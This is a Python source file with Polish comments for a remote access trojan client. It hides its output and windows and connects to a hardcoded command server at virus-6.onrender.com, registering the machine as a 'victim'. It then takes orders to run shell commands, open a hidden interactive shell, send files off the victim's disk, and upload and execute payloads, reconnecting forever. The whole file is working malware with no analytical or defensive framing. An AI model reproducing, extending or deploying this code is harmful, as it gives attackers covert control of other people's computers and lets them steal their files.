import time
import os
import json
import socket
import subprocess
import platform
import tempfile
import threading
import select
import sys


# ─── Tryb ukryty ────────────────────────────────────────────────
# Przekieruj stdout/stderr do /dev/null żeby nic nie wyświetlać
if not sys.stdout or not sys.stdout.isatty():
    pass  # już przekierowane
try:
    devnull = open(os.devnull, 'w')
    sys.stdout = devnull
    sys.stderr = devnull
except Exception:
    pass

# Flagi dla subprocess — ukrycie okna na Windows
if platform.system() == "Windows":
    CREATION_FLAGS = 0x08000000  # CREATE_NO_WINDOW
else:
    CREATION_FLAGS = 0
# ────────────────────────────────────────────────────────────────

try:
    from websocket import create_connection, WebSocketConnectionClosedException
except ImportError:
    os.system("pip install websocket-client")
    from websocket import create_connection, WebSocketConnectionClosedException

# ─── Konfiguracja ───────────────────────────────────────────────
SERVER_URL = "wss://virus-6.onrender.com/victim"
VICTIM_ID = f"{socket.gethostname()}-{platform.system()}"
RECONNECT_DELAY = 5
DOWNLOAD_DIR = tempfile.gettempdir()  # Folder na pobrane pliki
# ────────────────────────────────────────────────────────────────

# Bufor: po otrzymaniu JSON type=upload czekamy na następną wiadomość binarną
pending_upload_filename = None

# Interaktywny terminal
terminal_process = None
terminal_thread = None


def handle_terminal_start(ws):
    """Uruchamia interaktywny shell i streamuje output do attackera."""
    global terminal_process, terminal_thread

    # Zamknij istniejący terminal jeśli jest
    handle_terminal_stop(ws)

    try:
        shell_cmd = "cmd.exe" if platform.system() == "Windows" else "/bin/bash"

        popen_kwargs = dict(
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=False,
            bufsize=0,
            cwd=os.path.expanduser("~")
        )
        if platform.system() == "Windows":
            popen_kwargs["creationflags"] = CREATION_FLAGS
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            popen_kwargs["startupinfo"] = startupinfo

        terminal_process = subprocess.Popen(shell_cmd, **popen_kwargs)

        ws.send(json.dumps({"type": "terminal_started", "shell": shell_cmd, "pid": terminal_process.pid}))

        # Wątek czytający output z procesu i wysyłający do serwera
        def reader():
            global terminal_process
            proc = terminal_process
            try:
                while proc and proc.poll() is None:
                    data = proc.stdout.read(4096)
                    if not data:
                        break
                    try:
                        text = data.decode("utf-8", errors="replace")
                        ws.send(json.dumps({"type": "terminal_output", "output": text}))
                    except Exception:
                        break
            except Exception as e:
                try:
                    ws.send(json.dumps({"type": "terminal_output", "output": f"\n[terminal zakończony: {e}]\n"}))
                except Exception:
                    pass
            finally:
                try:
                    ws.send(json.dumps({"type": "terminal_stopped"}))
                except Exception:
                    pass

        terminal_thread = threading.Thread(target=reader, daemon=True)
        terminal_thread.start()

    except Exception as e:
        ws.send(json.dumps({"type": "error", "msg": f"Nie można uruchomić terminala: {e}"}))


def handle_terminal_input(ws, data):
    """Wysyła input do uruchomionego terminala."""
    global terminal_process
    if terminal_process is None or terminal_process.poll() is not None:
        ws.send(json.dumps({"type": "error", "msg": "Terminal nie jest uruchomiony"}))
        return

    user_input = data.get("input", "")
    try:
        terminal_process.stdin.write((user_input + "\n").encode("utf-8"))
        terminal_process.stdin.flush()
    except Exception as e:
        ws.send(json.dumps({"type": "error", "msg": f"Błąd zapisu do terminala: {e}"}))


def handle_terminal_stop(ws):
    """Zamyka interaktywny terminal."""
    global terminal_process, terminal_thread
    if terminal_process is not None:
        try:
            terminal_process.terminate()
            terminal_process.wait(timeout=3)
        except Exception:
            try:
                terminal_process.kill()
            except Exception:
                pass
        terminal_process = None


def handle_shell(ws, data):
    """Wykonuje polecenie shell i odsyła wynik."""
    command = data.get("command", "")
    if not command:
        ws.send(json.dumps({"type": "shell_result", "output": "(puste polecenie)"}))
        return

    try:
        run_kwargs = dict(
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=os.path.expanduser("~")
        )
        if platform.system() == "Windows":
            run_kwargs["creationflags"] = CREATION_FLAGS
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            run_kwargs["startupinfo"] = si
        result = subprocess.run(command, **run_kwargs)
        output = result.stdout + result.stderr
        if not output:
            output = "(brak wyjścia)"
    except subprocess.TimeoutExpired:
        output = "(timeout — polecenie trwało za długo)"
    except Exception as e:
        output = f"(błąd: {e})"

    ws.send(json.dumps({
        "type": "shell_result",
        "command": command,
        "output": output[:50000]  # limit żeby nie wysadzić WebSocket
    }))


def handle_upload(ws, data):
    """Przygotowuje odbiór pliku — właściwy plik przyjdzie jako binary."""
    global pending_upload_filename
    pending_upload_filename = data.get("filename", "uploaded_file.bin")
    ws.send(json.dumps({
        "type": "upload_ready",
        "filename": pending_upload_filename
    }))


def handle_binary(ws, raw_data):
    """Zapisuje otrzymane dane binarne jako plik."""
    global pending_upload_filename
    filename = pending_upload_filename or "received_file.bin"
    pending_upload_filename = None

    filepath = os.path.join(DOWNLOAD_DIR, filename)
    try:
        with open(filepath, "wb") as f:
            f.write(raw_data)
        ws.send(json.dumps({"type": "upload_done", "filepath": filepath, "size": len(raw_data)}))
    except Exception as e:
        ws.send(json.dumps({"type": "error", "msg": f"Nie można zapisać pliku: {e}"}))


def handle_download(ws, data):
    """Wysyła plik z dysku victima do serwera (→ attacker)."""
    filepath = data.get("filepath", "")
    if not filepath or not os.path.isfile(filepath):
        ws.send(json.dumps({"type": "error", "msg": f"Plik nie istnieje: {filepath}"}))
        return

    try:
        filesize = os.path.getsize(filepath)
        # Najpierw info JSON
        ws.send(json.dumps({
            "type": "download_start",
            "filepath": filepath,
            "size": filesize
        }))
        # Potem dane binarne
        with open(filepath, "rb") as f:
            ws.send_binary(f.read())
    except Exception as e:
        ws.send(json.dumps({"type": "error", "msg": f"Błąd odczytu pliku: {e}"}))


def handle_execute(ws, data):
    """Uruchamia plik na komputerze victima."""
    filepath = data.get("filepath", "")
    if not filepath or not os.path.isfile(filepath):
        ws.send(json.dumps({"type": "error", "msg": f"Plik nie istnieje: {filepath}"}))
        return

    try:
        # Nadaj uprawnienia na Linux/Mac
        if platform.system() != "Windows":
            os.chmod(filepath, 0o755)

        exec_kwargs = dict(
            shell=True,
            capture_output=True,
            text=True,
            timeout=60
        )
        if platform.system() == "Windows":
            exec_kwargs["creationflags"] = CREATION_FLAGS
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            exec_kwargs["startupinfo"] = si
        result = subprocess.run(filepath, **exec_kwargs)
        output = result.stdout + result.stderr
        if not output:
            output = "(brak wyjścia, kod: {})".format(result.returncode)

        ws.send(json.dumps({
            "type": "execute_result",
            "filepath": filepath,
            "output": output[:50000]
        }))
    except subprocess.TimeoutExpired:
        ws.send(json.dumps({"type": "execute_result", "filepath": filepath, "output": "(timeout)"}))
    except Exception as e:
        ws.send(json.dumps({"type": "error", "msg": f"Błąd wykonania: {e}"}))


def connect_loop():
    """Łączy się z serwerem i nasłuchuje poleceń."""
    url = f"{SERVER_URL}?id={VICTIM_ID}"

    while True:
        try:
            ws = create_connection(url)

            # Powitanie
            ws.send(json.dumps({
                "type": "hello",
                "id": VICTIM_ID,
                "os": platform.system(),
                "hostname": socket.gethostname(),
                "user": os.getenv("USER") or os.getenv("USERNAME", "?")
            }))

            while True:
                raw = ws.recv()
                if not raw:
                    break

                # Dane binarne (plik od attackera)
                if isinstance(raw, bytes):
                    handle_binary(ws, raw)
                    continue

                # JSON — polecenie
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    continue

                msg_type = data.get("type", "")

                if msg_type == "shell":
                    handle_shell(ws, data)
                elif msg_type == "upload":
                    handle_upload(ws, data)
                elif msg_type == "download":
                    handle_download(ws, data)
                elif msg_type == "execute":
                    handle_execute(ws, data)
                elif msg_type == "terminal_start":
                    handle_terminal_start(ws)
                elif msg_type == "terminal_input":
                    handle_terminal_input(ws, data)
                elif msg_type == "terminal_stop":
                    handle_terminal_stop(ws)
                else:
                    ws.send(json.dumps({"type": "error", "msg": f"Nieznany typ: {msg_type}"}))

        except WebSocketConnectionClosedException:
            pass
        except ConnectionRefusedError:
            pass
        except Exception:
            pass

        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    connect_loop()
